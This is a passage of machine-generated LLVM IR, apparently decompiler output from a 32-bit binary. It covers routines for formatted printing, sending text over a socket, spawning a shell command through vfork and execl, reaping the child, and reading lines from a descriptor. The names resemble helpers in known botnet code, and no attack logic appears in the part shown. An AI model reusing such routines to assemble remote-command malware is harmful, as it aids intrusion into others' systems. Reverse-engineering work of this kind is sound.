  store i32 %v2_8048791, i32* %v3_8048794, align 4
  %v5_8048795 = add i32 %v0_80487af, -16
  %v6_8048795 = inttoptr i32 %v5_8048795 to i32*
  store i32 %tmp3, i32* %v6_8048795, align 4
  %v0_8048798 = load i32, i32* %stack_var_-6, align 4
  %v6_8048798 = call i32 @prints(i32 %v0_8048798, i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8048798, i32* %eax.global-to-local, align 4
  %v0_804879d = load i32, i32* @esp, align 4
  %v1_804879d = add i32 %v0_804879d, 16
  %v5_80487a0 = add i32 %v6_8048798, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_80487a5:                             ; preds = %dec_label_pc_80485d8, %dec_label_pc_80485ae
  %stack_var_8.2 = phi i8* [ %stack_var_8.455, %dec_label_pc_80485ae ], [ %v22_80485bb, %dec_label_pc_80485d8 ]
  %v4_80487a5 = ptrtoint i8* %stack_var_8.2 to i32
  store i32 %v4_80487a5, i32* %eax.global-to-local, align 4
  %v2_80487a8 = load i8, i8* %stack_var_8.2, align 1
  %v3_80487a8 = zext i8 %v2_80487a8 to i32
  store i32 %v3_80487a8, i32* %eax.global-to-local, align 4
  %v2_80487b2 = add i32 %v0_80487af, -12
  %v3_80487b2 = inttoptr i32 %v2_80487b2 to i32*
  store i32 %v3_80487a8, i32* %v3_80487b2, align 4
  %v5_80487b3 = add i32 %v0_80487af, -16
  %v6_80487b3 = inttoptr i32 %v5_80487b3 to i32*
  store i32 %tmp3, i32* %v6_80487b3, align 4
  %v2_80487b6 = inttoptr i32 %stack_var_-28.154 to i32*
  %v3_80487b6 = call i32 @printchar(i32* %v2_80487b6, i32 %stack_var_-24.151)
  store i32 %v3_80487b6, i32* %eax.global-to-local, align 4
  %v0_80487bb = load i32, i32* @esp, align 4
  %v1_80487bb = add i32 %v0_80487bb, 16
  %v4_80487be = add i32 %stack_var_-28.154, 1
  br label %dec_label_pc_80487c1

dec_label_pc_80487c1:                             ; preds = %dec_label_pc_804876e, %dec_label_pc_8048777, %dec_label_pc_8048741, %dec_label_pc_8048708, %dec_label_pc_8048670, %dec_label_pc_80486cf, %dec_label_pc_8048696, %dec_label_pc_80487a5
  %v4_804867366 = phi i32 [ %v1_80487bb, %dec_label_pc_80487a5 ], [ %v0_80487af, %dec_label_pc_804876e ], [ %v1_804879d, %dec_label_pc_8048777 ], [ %v1_8048766, %dec_label_pc_8048741 ], [ %v1_804872d, %dec_label_pc_8048708 ], [ %v1_80486f4, %dec_label_pc_80486cf ], [ %v1_80486bb, %dec_label_pc_8048696 ], [ %v1_8048682, %dec_label_pc_8048670 ]
  %stack_var_-24.0 = phi i32 [ %stack_var_-24.151, %dec_label_pc_80487a5 ], [ %stack_var_-24.151, %dec_label_pc_804876e ], [ %stack_var_-24.151, %dec_label_pc_8048777 ], [ %stack_var_-24.151, %dec_label_pc_8048741 ], [ %stack_var_-24.151, %dec_label_pc_8048708 ], [ %stack_var_-24.151, %dec_label_pc_80486cf ], [ %stack_var_-24.151, %dec_label_pc_8048696 ], [ %v2_8048656, %dec_label_pc_8048670 ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.152, %dec_label_pc_80487a5 ], [ %stack_var_12.152, %dec_label_pc_804876e ], [ %v1_804877a, %dec_label_pc_8048777 ], [ %v1_8048744, %dec_label_pc_8048741 ], [ %v1_804870b, %dec_label_pc_8048708 ], [ %v1_80486d2, %dec_label_pc_80486cf ], [ %v1_8048699, %dec_label_pc_8048696 ], [ %v1_804864e, %dec_label_pc_8048670 ]
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_80487a5 ], [ %stack_var_8.1.lcssa, %dec_label_pc_804876e ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048777 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048741 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048708 ], [ %stack_var_8.1.lcssa, %dec_label_pc_80486cf ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048696 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048670 ]
  %stack_var_-28.0 = phi i32 [ %v4_80487be, %dec_label_pc_80487a5 ], [ %stack_var_-28.154, %dec_label_pc_804876e ], [ %v5_80487a0, %dec_label_pc_8048777 ], [ %v5_8048769, %dec_label_pc_8048741 ], [ %v5_8048730, %dec_label_pc_8048708 ], [ %v5_80486f7, %dec_label_pc_80486cf ], [ %v5_80486be, %dec_label_pc_8048696 ], [ %v5_8048685, %dec_label_pc_8048670 ]
  %v4_80487c1 = ptrtoint i8* %stack_var_8.3 to i32
  %v5_80487c1 = add i32 %v4_80487c1, 1
  %stack_var_8.4 = inttoptr i32 %v5_80487c1 to i8*
  store i32 %v5_80487c1, i32* %eax.global-to-local, align 4
  %v2_80487c7 = load i8, i8* %stack_var_8.4, align 1
  %v3_80487c7 = zext i8 %v2_80487c7 to i32
  %v5_80487c7 = and i32 %v5_80487c1, -256
  %v6_80487c7 = or i32 %v3_80487c7, %v5_80487c7
  store i32 %v6_80487c7, i32* %eax.global-to-local, align 4
  %v4_80487c9 = icmp eq i8 %v2_80487c7, 0
  %v1_80487cb = icmp eq i1 %v4_80487c9, false
  br i1 %v1_80487cb, label %dec_label_pc_80485ae, label %dec_label_pc_80487d1

dec_label_pc_80487d1:                             ; preds = %dec_label_pc_80487c1, %dec_label_pc_80485bb, %entry
  %stack_var_-28.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-28.154, %dec_label_pc_80485bb ], [ %stack_var_-28.0, %dec_label_pc_80487c1 ]
  %v4_80487d1 = icmp eq i32* %arg1, null
  br i1 %v4_80487d1, label %dec_label_pc_80487df, label %dec_label_pc_80487d7

dec_label_pc_80487d7:                             ; preds = %dec_label_pc_80487d1
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v2_80487da = load i32, i32* %arg1, align 4
  store i32 %v2_80487da, i32* %eax.global-to-local, align 4
  %v1_80487dc = inttoptr i32 %v2_80487da to i8*
  store i8 0, i8* %v1_80487dc, align 1
  br label %dec_label_pc_80487df

dec_label_pc_80487df:                             ; preds = %dec_label_pc_80487d1, %dec_label_pc_80487d7
  store i32 %stack_var_-28.1.lcssa, i32* %eax.global-to-local, align 4
  %v2_80487e2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80487e2, i32* @ebp, align 4
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i32 %v5_80487c7, { 1, 0 }
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_80487c1, { 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.2, { 0, 2, 1 }
  uselistorder i32 %v2_8048656, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_8048633.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_8048630.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.1.lcssa, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-36.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %stack_var_-32.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_80485fa, { 1, 2, 3, 0 }
  uselistorder i8* %v22_80485bb, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-24.151, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_12.152, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 %stack_var_8.4.in53, { 2, 1, 0 }
  uselistorder i32 %stack_var_-28.154, { 0, 3, 2, 1, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 %v0_80487af, { 38, 1, 0, 5, 4, 3, 2, 12, 11, 10, 9, 8, 7, 6, 19, 18, 17, 16, 15, 14, 13, 26, 25, 24, 23, 22, 21, 20, 33, 32, 31, 30, 29, 28, 27, 37, 36, 35, 34 }
  uselistorder i32 %tmp3, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 6, 7, 8, 55, 56, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 57, 58, 59, 60, 61, 62, 63, 64, 65, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 42, 43, 44, 40, 1, 0, 45, 46, 2, 4, 47, 48, 49, 50, 51, 52, 53, 54, 3, 5 }
  uselistorder i32 (i32)* @printi, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_80487df, { 1, 0 }
  uselistorder label %dec_label_pc_80487c1, { 7, 1, 0, 2, 3, 5, 6, 4 }
  uselistorder label %dec_label_pc_8048670, { 1, 0 }
  uselistorder label %dec_label_pc_8048642, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048639, { 1, 0 }
  uselistorder label %dec_label_pc_80485fa, { 1, 0 }
  uselistorder label %dec_label_pc_80485ae, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i32, align 4
  %v4_80487ed = ptrtoint i32* %stack_var_8 to i32
  %v4_80487fc = call i32 @print(i32* null, i32 %arg1, i32 %v4_80487ed)
  ret i32 %v4_80487fc
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %v4_804880f = ptrtoint i32* %stack_var_12 to i32
  %v4_8048820 = call i32 @print(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_804880f)
  ret i32 %v4_8048820
}

define i32 @Rootsprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %v0_804882d = load i32, i32* @edi, align 4
  %v1_8048839 = call i32 @malloc(i32 2048)
  store i32 %v1_8048839, i32* %stack_var_-20, align 4
  %v3_8048855 = inttoptr i32 %v1_8048839 to i8*
  %v4_8048855 = call i32 @__GI_memset(i8* %v3_8048855, i32 0, i32 2048)
  %v4_8048866 = ptrtoint i32* %stack_var_12 to i32
  %v4_8048878 = call i32 @print(i32* nonnull %stack_var_-20, i32 %arg2, i32 %v4_8048866)
  %v3_8048891 = call i32 @_strlen(i8* %v3_8048855)
  %v6_8048898 = add i32 %v1_8048839, %v3_8048891
  %v1_804889b = inttoptr i32 %v6_8048898 to i8*
  store i8 10, i8* %v1_804889b, align 1
  store i1 false, i1* @df, align 1
  store i32 %v1_8048839, i32* @edi, align 4
  %v3_80488af = call i32 @_strlen(i8* %v3_8048855)
  %v4_80488c2 = call i32 @__libc_send(i32 %arg1, i32 %v1_8048839, i32 %v3_80488af, i32 16384)
  %v1_80488d3 = call i32 @free(i32 %v1_8048839)
  store i32 %v0_804882d, i32* @edi, align 4
  ret i32 %v4_80488c2

; uselistorder directives
  uselistorder i32 %v1_8048839, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @fdpopen() local_unnamed_addr {
entry:
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80488e6 = load i32, i32* @edi, align 4
  store i32 %v0_80488e6, i32* %stack_var_-8, align 4
  %v4_80488ea = ptrtoint i8* %tmp24 to i32
  %v2_80488ed = load i8, i8* %tmp24, align 1
  %v10_80488ef = icmp eq i8 %v2_80488ed, 114
  br i1 %v10_80488ef, label %dec_label_pc_80488fc, label %dec_label_pc_80488f3

dec_label_pc_80488f3:                             ; preds = %entry
  %v2_80488f6 = load i8, i8* %tmp24, align 1
  %v10_80488f8 = icmp eq i8 %v2_80488f6, 119
  %v1_80488fa = icmp eq i1 %v10_80488f8, false
  br i1 %v1_80488fa, label %dec_label_pc_8048ad1, label %dec_label_pc_80488fc

dec_label_pc_80488fc:                             ; preds = %dec_label_pc_80488f3, %entry
  %v1_80488ff = add i32 %v4_80488ea, 1
  %v1_8048900 = inttoptr i32 %v1_80488ff to i8*
  %v2_8048900 = load i8, i8* %v1_8048900, align 1
  %v4_8048902 = icmp eq i8 %v2_8048900, 0
  br i1 %v4_8048902, label %dec_label_pc_8048912, label %dec_label_pc_8048ad1

dec_label_pc_8048912:                             ; preds = %dec_label_pc_80488fc
  %v2_8048915 = ptrtoint i32* %stack_var_-24 to i32
  %v1_8048919 = call i32 @__GI_pipe(i32 %v2_8048915)
  %v2_8048921 = icmp slt i32 %v1_8048919, 0
  %v1_8048923 = icmp eq i1 %v2_8048921, false
  br i1 %v1_8048923, label %dec_label_pc_8048931, label %dec_label_pc_8048ad1

dec_label_pc_8048931:                             ; preds = %dec_label_pc_8048912
  %v0_8048931 = load i8*, i8** @global_var_805db20.13, align 4
  %v2_8048936 = icmp eq i8* %v0_8048931, null
  %v1_8048938 = icmp eq i1 %v2_8048936, false
  br i1 %v1_8048938, label %bb, label %dec_label_pc_804893a

dec_label_pc_804893a:                             ; preds = %dec_label_pc_8048931
  %v0_804893a = call i32 @getdtablesize()
  %tmp37 = icmp slt i32 %v0_804893a, 1
  %tmp38 = icmp eq i1 %tmp37, false
  br i1 %tmp38, label %dec_label_pc_8048954, label %dec_label_pc_8048ad1

dec_label_pc_8048954:                             ; preds = %dec_label_pc_804893a
  %v2_8048957 = mul i32 %v0_804893a, 4
  %v1_804895e = call i32 @malloc(i32 %v2_8048957)
  %v1_8048966 = inttoptr i32 %v1_804895e to i8*
  store i8* %v1_8048966, i8** @global_var_805db20.13, align 32
  %v2_8048970 = icmp eq i32 %v1_804895e, 0
  %v1_8048972 = icmp eq i1 %v2_8048970, false
  br i1 %v1_8048972, label %dec_label_pc_8048980, label %dec_label_pc_8048ad1

dec_label_pc_8048980:                             ; preds = %dec_label_pc_8048954
  %v1_8048983 = mul i32 %v0_804893a, 4
  store i32 %v1_804895e, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8048994 = and i32 %v1_804895e, -256
  %v5_8048996 = call i8* @_memset(i8* %v1_8048966, i32 %v1_8048994, i32 %v1_8048983)
  br label %bb

bb:                                               ; preds = %dec_label_pc_8048931, %dec_label_pc_8048980
  %v0_8048998 = call i32 @__vfork()
  %v13_80489a6 = icmp eq i32 %v0_8048998, -1
  br i1 %v13_80489a6, label %dec_label_pc_80489b7, label %dec_label_pc_80489ac

dec_label_pc_80489ac:                             ; preds = %bb
  %v4_80489ac = icmp eq i32 %v0_8048998, 0
  %v2_80489e4 = load i8, i8* %tmp24, align 1
  %v10_80489e6 = icmp eq i8 %v2_80489e4, 114
  %v1_80489e8 = icmp eq i1 %v10_80489e6, false
  br i1 %v4_80489ac, label %dec_label_pc_80489e1, label %dec_label_pc_8048a82

dec_label_pc_80489b7:                             ; preds = %bb
  %v3_80489b7 = load i32, i32* %stack_var_-24, align 4
  %v1_80489be = call i32 @__libc_close(i32 %v3_80489b7)
  %v1_80489cd = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048ad1

dec_label_pc_80489e1:                             ; preds = %dec_label_pc_80489ac
  br i1 %v1_80489e8, label %dec_label_pc_8048a23, label %dec_label_pc_80489ea

dec_label_pc_80489ea:                             ; preds = %dec_label_pc_80489e1
  %v9_80489ed = icmp eq i32 %tmp19, 1
  br i1 %v9_80489ed, label %dec_label_pc_80489ea.dec_label_pc_8048a12_crit_edge, label %dec_label_pc_80489f2

dec_label_pc_80489ea.dec_label_pc_8048a12_crit_edge: ; preds = %dec_label_pc_80489ea
  br label %dec_label_pc_8048a12

dec_label_pc_80489f2:                             ; preds = %dec_label_pc_80489ea
  %v2_80489fb = call i32 @dup2(i32 %tmp19, i32 1)
  %v1_8048a0a = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048a12

dec_label_pc_8048a12:                             ; preds = %dec_label_pc_80489ea.dec_label_pc_8048a12_crit_edge, %dec_label_pc_80489f2
  %v3_8048a12 = load i32, i32* %stack_var_-24, align 4
  %v1_8048a19 = call i32 @__libc_close(i32 %v3_8048a12)
  br label %dec_label_pc_8048a59

dec_label_pc_8048a23:                             ; preds = %dec_label_pc_80489e1
  %v3_8048a23 = load i32, i32* %stack_var_-24, align 4
  %v1_8048a26 = icmp eq i32 %v3_8048a23, 0
  br i1 %v1_8048a26, label %dec_label_pc_8048a23.dec_label_pc_8048a4a_crit_edge, label %dec_label_pc_8048a2a

dec_label_pc_8048a23.dec_label_pc_8048a4a_crit_edge: ; preds = %dec_label_pc_8048a23
  br label %dec_label_pc_8048a4a

dec_label_pc_8048a2a:                             ; preds = %dec_label_pc_8048a23
  %v2_8048a33 = call i32 @dup2(i32 %v3_8048a23, i32 0)
  %v3_8048a3b = load i32, i32* %stack_var_-24, align 4
  %v1_8048a42 = call i32 @__libc_close(i32 %v3_8048a3b)
  br label %dec_label_pc_8048a4a

dec_label_pc_8048a4a:                             ; preds = %dec_label_pc_8048a23.dec_label_pc_8048a4a_crit_edge, %dec_label_pc_8048a2a
  %v1_8048a51 = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048a59

dec_label_pc_8048a59:                             ; preds = %dec_label_pc_8048a12, %dec_label_pc_8048a4a
  %v8_8048a70 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_8055d8a.16 to i32), i32 ptrtoint ([3 x i8]* @global_var_8055d87.15 to i32), i32 ptrtoint ([3 x i8]* @global_var_8055d84.14 to i32), i32 %tmp18, i32 0)
  %v1_8048a7d = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8048a82:                             ; preds = %dec_label_pc_80489ac
  br i1 %v1_80489e8, label %dec_label_pc_8048aa2, label %dec_label_pc_8048a8b

dec_label_pc_8048a8b:                             ; preds = %dec_label_pc_8048a82
  %v3_8048a8b = load i32, i32* %stack_var_-24, align 4
  %v2_8048a98 = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048ab7

dec_label_pc_8048aa2:                             ; preds = %dec_label_pc_8048a82
  %v3_8048aa8 = load i32, i32* %stack_var_-24, align 4
  %v2_8048aaf = call i32 @__libc_close(i32 %v3_8048aa8)
  br label %dec_label_pc_8048ab7

dec_label_pc_8048ab7:                             ; preds = %dec_label_pc_8048a8b, %dec_label_pc_8048aa2
  %stack_var_-28.0 = phi i32 [ %v3_8048a8b, %dec_label_pc_8048a8b ], [ %tmp19, %dec_label_pc_8048aa2 ]
  %v2_8048aba = mul i32 %stack_var_-28.0, 4
  %v0_8048abf = load i8*, i8** @global_var_805db20.13, align 4
  %v1_8048abf = ptrtoint i8* %v0_8048abf to i32
  %v2_8048ac4 = add i32 %v1_8048abf, %v2_8048aba
  %v2_8048ac9 = inttoptr i32 %v2_8048ac4 to i32*
  store i32 %v0_8048998, i32* %v2_8048ac9, align 4
  br label %dec_label_pc_8048ad1

dec_label_pc_8048ad1:                             ; preds = %dec_label_pc_8048954, %dec_label_pc_804893a, %dec_label_pc_8048912, %dec_label_pc_80488f3, %dec_label_pc_80488fc, %dec_label_pc_80489b7, %dec_label_pc_8048ab7
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_80489b7 ], [ %stack_var_-28.0, %dec_label_pc_8048ab7 ], [ -1, %dec_label_pc_80488fc ], [ -1, %dec_label_pc_80488f3 ], [ -1, %dec_label_pc_8048912 ], [ -1, %dec_label_pc_804893a ], [ -1, %dec_label_pc_8048954 ]
  %v3_8048ad4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048ad4, i32* @edi, align 4
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %v0_8048998, { 1, 2, 0 }
  uselistorder i32 %v1_804895e, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804893a, { 2, 0, 1 }
  uselistorder i8* %tmp24, { 0, 1, 3, 2 }
  uselistorder i32 %tmp19, { 1, 6, 3, 4, 5, 0, 2 }
  uselistorder label %dec_label_pc_8048ad1, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8048ab7, { 1, 0 }
  uselistorder label %dec_label_pc_8048a59, { 1, 0 }
  uselistorder label %dec_label_pc_8048a4a, { 1, 0 }
  uselistorder label %dec_label_pc_8048a12, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @fdpclose() local_unnamed_addr {
entry:
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048ad9 = load i32, i32* @ebp, align 4
  store i32 %v0_8048ad9, i32* %stack_var_-4, align 4
  %v0_8048ae2 = load i8*, i8** @global_var_805db20.13, align 4
  %v2_8048ae7 = icmp eq i8* %v0_8048ae2, null
  br i1 %v2_8048ae7, label %dec_label_pc_8048c35, label %dec_label_pc_8048aeb

dec_label_pc_8048aeb:                             ; preds = %entry
  %v1_8048ae2 = ptrtoint i8* %v0_8048ae2 to i32
  %v2_8048aee = mul i32 %tmp11, 4
  %v2_8048af8 = add i32 %v1_8048ae2, %v2_8048aee
  %v1_8048afb = inttoptr i32 %v2_8048af8 to i32*
  %v2_8048afb = load i32, i32* %v1_8048afb, align 4
  %v1_8048afd = icmp eq i32 %v2_8048afb, 0
  %v1_8048aff = icmp eq i1 %v1_8048afd, false
  br i1 %v1_8048aff, label %dec_label_pc_8048b10, label %dec_label_pc_8048c35

dec_label_pc_8048b10:                             ; preds = %dec_label_pc_8048aeb
  %v1_8048b16 = call i32 @__libc_close(i32 %tmp11)
  %v2_8048b21 = ptrtoint i32* %stack_var_-264 to i32
  %v1_8048b28 = call i32 @sigemptyset(i32 %v2_8048b21)
  %v2_8048b3c = call i32 @__GI_sigaddset(i32 %v2_8048b21, i32 2)
  %v2_8048b50 = call i32 @__GI_sigaddset(i32 %v2_8048b21, i32 3)
  %v2_8048b64 = call i32 @__GI_sigaddset(i32 %v2_8048b21, i32 1)
  %v2_8048b6f = ptrtoint i32* %stack_var_-136 to i32
  %v3_8048b7f = bitcast i32* %stack_var_-264 to %_TYPEDEF_sigset_t*
  %v4_8048b7f = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8048b7f, i32 %v2_8048b6f)
  %v2_8048b9e = ptrtoint i32* %stack_var_-268 to i32
  br label %dec_label_pc_8048b87

dec_label_pc_8048b87:                             ; preds = %dec_label_pc_8048bbd, %dec_label_pc_8048b10
  %v0_8048b8f = load i8*, i8** @global_var_805db20.13, align 4
  %v1_8048b8f = ptrtoint i8* %v0_8048b8f to i32
  %v2_8048b94 = add i32 %v1_8048b8f, %v2_8048aee
  %v1_8048b97 = inttoptr i32 %v2_8048b94 to i32*
  %v2_8048b97 = load i32, i32* %v1_8048b97, align 4
  %v3_8048ba6 = call i32 @__libc_waitpid(i32 %v2_8048b97, i32 %v2_8048b9e, i32 0)
  %v13_8048bb4 = icmp eq i32 %v3_8048ba6, -1
  %v1_8048bbb = icmp eq i1 %v13_8048bb4, false
  br i1 %v1_8048bbb, label %dec_label_pc_8048bc9, label %dec_label_pc_8048bbd

dec_label_pc_8048bbd:                             ; preds = %dec_label_pc_8048b87
  %v1_8048bbd = call i32 @__errno_location(i32 %v3_8048ba6)
  %v1_8048bc2 = inttoptr i32 %v1_8048bbd to i32*
  %v2_8048bc2 = load i32, i32* %v1_8048bc2, align 4
  %v9_8048bc4 = icmp eq i32 %v2_8048bc2, 4
  br i1 %v9_8048bc4, label %dec_label_pc_8048b87, label %dec_label_pc_8048bc9

dec_label_pc_8048bc9:                             ; preds = %dec_label_pc_8048bbd, %dec_label_pc_8048b87
  %v13_8048bb4.lcssa = phi i1 [ true, %dec_label_pc_8048bbd ], [ false, %dec_label_pc_8048b87 ]
  %v3_8048bd7 = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  %v4_8048bd7 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8048bd7, i32 0)
  %v2_8048be5 = mul i32 %tmp8, 4
  %v0_8048bea = load i8*, i8** @global_var_805db20.13, align 4
  %v1_8048bea = ptrtoint i8* %v0_8048bea to i32
  %v2_8048bef = add i32 %v1_8048bea, %v2_8048be5
  %v1_8048bf2 = inttoptr i32 %v2_8048bef to i32*
  store i32 0, i32* %v1_8048bf2, align 4
  br i1 %v13_8048bb4.lcssa, label %dec_label_pc_8048c29, label %dec_label_pc_8048c01

dec_label_pc_8048c01:                             ; preds = %dec_label_pc_8048bc9
  %v3_8048c01 = load i32, i32* %stack_var_-268, align 4
  %v1_8048c0d = and i32 %v3_8048c01, 65280
  %v2_8048c141 = udiv i32 %v1_8048c0d, 256
  br label %dec_label_pc_8048c29

dec_label_pc_8048c29:                             ; preds = %dec_label_pc_8048bc9, %dec_label_pc_8048c01
  %storemerge2 = phi i32 [ %v2_8048c141, %dec_label_pc_8048c01 ], [ -1, %dec_label_pc_8048bc9 ]
  %v2_8048c3b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048c35

dec_label_pc_8048c35:                             ; preds = %entry, %dec_label_pc_8048aeb, %dec_label_pc_8048c29
  %v2_8048c3b = phi i32 [ %v2_8048c3b.pre, %dec_label_pc_8048c29 ], [ %v0_8048ad9, %dec_label_pc_8048aeb ], [ %v0_8048ad9, %entry ]
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_8048c29 ], [ -1, %dec_label_pc_8048aeb ], [ -1, %entry ]
  store i32 %v2_8048c3b, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8048ba6, { 1, 0 }
  uselistorder i32 %v2_8048aee, { 1, 0 }
  uselistorder i8* %v0_8048ae2, { 1, 0 }
  uselistorder i32 %tmp11, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i8** @global_var_805db20.13, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8048c35, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048c29, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  br label %dec_label_pc_8048c76

dec_label_pc_8048c53:                             ; preds = %dec_label_pc_8048c7e
  %v3_8048c62 = inttoptr i32 %v5_8048c81 to i32*
  %v4_8048c62 = call i32 @__libc_read(i32 %arg3, i32* %v3_8048c62, i32 1)
  %v4_8048c6d = add nuw i32 %storemerge115, 1
  %v8_8048c70 = icmp eq i32 %v4_8048c62, 0
  %v12_8048c70 = icmp eq i32 %v4_8048c62, 1
  %v1_8048c74 = icmp eq i1 %v12_8048c70, false
  br i1 %v1_8048c74, label %dec_label_pc_8048c8b, label %dec_label_pc_8048c76

dec_label_pc_8048c76:                             ; preds = %entry, %dec_label_pc_8048c53
  %v8_8048c7016 = phi i1 [ false, %entry ], [ %v8_8048c70, %dec_label_pc_8048c53 ]
  %storemerge115 = phi i32 [ 0, %entry ], [ %v4_8048c6d, %dec_label_pc_8048c53 ]
  %v5_8048c7c = icmp slt i32 %storemerge115, %arg2
  br i1 %v5_8048c7c, label %dec_label_pc_8048c7e, label %dec_label_pc_8048c8b

dec_label_pc_8048c7e:                             ; preds = %dec_label_pc_8048c76
  %v5_8048c81 = add i32 %storemerge115, %arg1
  %v1_8048c84 = add i32 %v5_8048c81, -1
  %v1_8048c85 = inttoptr i32 %v1_8048c84 to i8*
  %v2_8048c85 = load i8, i8* %v1_8048c85, align 1
  %v10_8048c87 = icmp eq i8 %v2_8048c85, 10
  %v1_8048c89 = icmp eq i1 %v10_8048c87, false
  br i1 %v1_8048c89, label %dec_label_pc_8048c53, label %dec_label_pc_8048c8b

dec_label_pc_8048c8b:                             ; preds = %dec_label_pc_8048c76, %dec_label_pc_8048c7e, %dec_label_pc_8048c53
  %v8_8048c70.lcssa = phi i1 [ %v8_8048c7016, %dec_label_pc_8048c76 ], [ %v8_8048c7016, %dec_label_pc_8048c7e ], [ %v8_8048c70, %dec_label_pc_8048c53 ]
  br i1 %v8_8048c70.lcssa, label %dec_label_pc_8048ca0, label %dec_label_pc_8048c91

dec_label_pc_8048c91:                             ; preds = %dec_label_pc_8048c8b
  br label %dec_label_pc_8048ca0

dec_label_pc_8048ca0:                             ; preds = %dec_label_pc_8048c8b, %dec_label_pc_8048c91
  %storemerge = phi i32 [ %arg1, %dec_label_pc_8048c91 ], [ 0, %dec_label_pc_8048c8b ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v5_8048c81, { 1, 0 }
  uselistorder i32 %storemerge115, { 2, 0, 1 }
  uselistorder i1 %v8_8048c7016, { 1, 0 }
  uselistorder i1 %v8_8048c70, { 1, 0 }
  uselistorder i32 %v4_8048c62, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048ca0, { 1, 0 }
  uselistorder label %dec_label_pc_8048c8b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048c76, { 1, 0 }
}

define i32 @parseHex(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8048cd55 = ptrtoint i8* %arg1 to i32
